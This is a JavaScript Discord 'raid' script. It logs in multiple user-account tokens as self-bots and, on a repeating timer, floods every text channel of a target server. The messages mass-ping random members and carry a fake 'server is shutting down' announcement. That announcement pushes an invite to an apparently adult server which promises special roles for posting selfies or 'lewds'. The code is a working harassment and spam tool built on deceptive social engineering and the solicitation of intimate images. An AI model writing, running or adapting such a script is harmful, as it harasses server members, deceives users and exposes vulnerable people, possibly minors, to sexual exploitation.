const Discord = require('discord.js');
var request = require('request');

/*
  ID of target server.
  Make sure you have manually joined the account into this server.
*/
var targetID = '';

/*
  Account tokens. (NOT bot tokens)
*/
var tokens = [

]

/*
  Server you want to invite users to.
  Name and invite link.
*/
var homeServer = {
  invite:`https://discord.gg/Dgggg`,
  name: '/h/'
}

let clients = []
let seshs = []

var online = 0;
var offline = 0;

console.log('Logging in.')
tokens.forEach(t => {
  const client = new Discord.Client();

  client.on('ready', () => {
    online++;
    clients.push({
      token: t,
      client: client
    });
  });

  client.login(t).catch(e => {
    offline++;
  });
})

var halt = setInterval(() => {
  if (online + offline == tokens.length) {
    clearInterval(halt);
    console.log(`${online}/${tokens.length} logged in.`)

    doRaid(clients).then(r => {

    })
  }
}, 100)

function doRaid(clients) {

  return new Promise((resolve, reject) => {
    var guild = clients[0].client.guilds.get(targetID)
    var chans = [];
    console.log(`Target server: ${guild}`)
    guild.channels.forEach(chan => {
      if (chan.type == 'text')
      {
        chans.push(chan)
      }
    })
    console.log('Channels:')
    chans.forEach(chan => {
      console.log(`\t#${chan.name}`)
    })

    console.log('\nRaid initiated!')

    var timeout = 2000;
    var i = 0;

    clients.forEach(c => {

      setTimeout(() => {
        var sesh = setInterval(() => {

          var bot = c
          var chans = bot.client.guilds.get(targetID).channels.filter(c => c.type == 'text').array()

          chans.forEach(chan => {

            var memb = chan.members.array();

            var pingMsg = '';
            while(true) {
              var rusr = `${memb[Math.floor(Math.random()*memb.length)]}\n`;
              if ( (pingMsg + rusr).length >= 2000) break;

              pingMsg += rusr;
            }

            var emb = new Discord.RichEmbed()
              .setColor('#ff66ff')
              .setTitle(`${chan.guild.name} is shutting down!`)
              .setURL(homeServer.invite)
              .setAuthor(`Emergency message!`, 'http://icons.iconarchive.com/icons/webalys/kameleon.pics/256/Love-Letter-icon.png', homeServer.invite)
              .setDescription(`
                With all due regret we must inform you that the admins of __**${chan.guild.name}**__ have decided to shut the server down permanently in favor of a better server.
                `)
              .addField('Invite', `
              Here is your invite to the better alternative server, [🔞 __**${homeServer.name}**__ 🔞](${homeServer.invite})! Click to join.
              `)
              //.setThumbnail(h.iconURL)
              //.addField('Okay?', ``)
              /*
              .addField('Members', `
              **${h.presences.array().length} online**.
              ${h.memberCount} total.
              `, true) */
              .setImage('https://i.imgur.com/PWsW2pG.png')
              .setTimestamp()
              .setFooter('from the Dark Overlord', 'http://icons.iconarchive.com/icons/webalys/kameleon.pics/256/Love-Letter-icon.png')
              .addField(`About the new server`, `
                  • Always new members.
                  • Original content.
                  • [Our own website](https://trapan.net).
                  • Invite ranks.
                `, true)
                .addField(`Special roles`, `
                    If you post pictures of yourself (selfies or lewds) you can get a special role called ***Good Girl*** or ***Good Boy*** depending on your gender preference.
                  `, true)
                .addBlankField()
                .addField(`JOIN NOW!`, `

                  [**Invite link: ${homeServer.name}**\t~\t${homeServer.invite}](${homeServer.invite})

                  [**Invite link: ${homeServer.name}**\t~\t${homeServer.invite}](${homeServer.invite})

                  [**Invite link: ${homeServer.name}**\t~\t${homeServer.invite}](${homeServer.invite})

                 `)


            chan.send(pingMsg, {embed: emb}).then(m => {
              //console.log(m)
            }).catch(e => {
              //console.log(e);
              console.log(`${c.username}: ${e}`)
            })
          })

          /*
          var randChan = chans[Math.floor(Math.random()*chans.length)];
          var pingMsg = '';
          randChan.send('a').then(m => {
            //console.log(m)
          }).catch(e => {
            //console.log(e);
            console.log(`${c.username}: ${e}`)
          })
          */
        }, timeout)

        seshs.push(sesh);

      }, timeout * i);
      i++;
    })
  })
}
